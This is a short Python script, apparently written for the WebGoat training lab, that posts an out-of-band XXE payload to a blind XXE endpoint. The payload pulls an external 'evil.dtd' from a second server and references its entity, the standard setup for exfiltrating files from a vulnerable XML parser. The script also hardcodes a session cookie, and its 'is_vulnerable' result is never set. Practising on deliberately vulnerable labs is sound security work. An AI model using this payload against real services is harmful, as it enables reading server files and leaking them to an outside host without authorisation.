import requests
import time


# url = "http://127.0.0.1:8080/WebGoat/xxe/blind"



def oob_xxe(url, dtd_file="http://localhost:9090/files/xxexxe/evil.dtd"):
    is_vulnerable = False
    headers = {'Content-Type': 'application/xml'}
    cookies = {'JSESSIONID': 'PZo86PHS-Wh1PZmPeLUfA6T5MYrNo6OQAhVbwVKy'}
    payload = f'''<?xml version="1.0"?>
    <!DOCTYPE comment SYSTEM "{dtd_file}">
    <comment>
    <text>&get;</text>
    </comment>
    '''
    response = requests.post(url, headers=headers, data=payload, cookies=cookies)
    print(response.text)
    return is_vulnerable
